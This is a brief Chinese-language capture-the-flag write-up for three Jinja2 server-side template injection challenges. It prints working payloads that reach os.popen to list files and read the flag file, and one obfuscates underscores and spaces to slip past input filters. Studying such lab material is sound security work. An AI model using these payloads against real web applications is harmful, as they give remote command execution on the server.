本大題參考 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
以及 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti

# STI01
使用以下 ~~傳說中的奇蹟~~ 指令
```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}} 
```
![alt text](image.png)
# STI02
同第一題
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat FLAG').read()}}
```
![](image-1.png)
# STI03
使用以下 ~~傳說中的第二個奇蹟~~ 指令
```
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat${IFS}FLAG')|attr('read')()%}{%print(a)%}{%endwith%}
```
![alt text](image-2.png)
